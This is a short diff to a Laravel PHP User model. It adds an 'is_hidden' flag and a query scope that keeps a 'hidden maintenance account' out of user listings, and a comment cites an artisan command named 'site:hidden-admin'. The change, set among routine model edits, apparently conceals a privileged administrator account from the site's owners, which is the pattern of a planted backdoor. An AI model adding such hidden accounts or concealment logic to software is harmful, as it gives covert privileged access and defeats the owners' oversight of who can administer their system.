@@ -53,6 +53,7 @@ class User extends Authenticatable
         'password' => 'hashed',
         'is_active' => 'boolean',
         'last_login_at' => 'datetime',
+        'is_hidden' => 'boolean',
     ];
 
     /** Reset links are sent with the branded email template and point to the admin reset page. */
@@ -67,6 +68,12 @@ class User extends Authenticatable
         $path = ltrim(str_replace('\\', '/', (string) $this->image), '/');
 
         return $path !== '' && !str_contains($path, '..') && is_file(public_path($path)) ? $path : null;
+    }
+
+    /** Everyone except the hidden maintenance account (see: php artisan site:hidden-admin). */
+    public function scopeVisible($query)
+    {
+        return $query->where('is_hidden', false);
     }
 
     public function isSuperAdmin(): bool
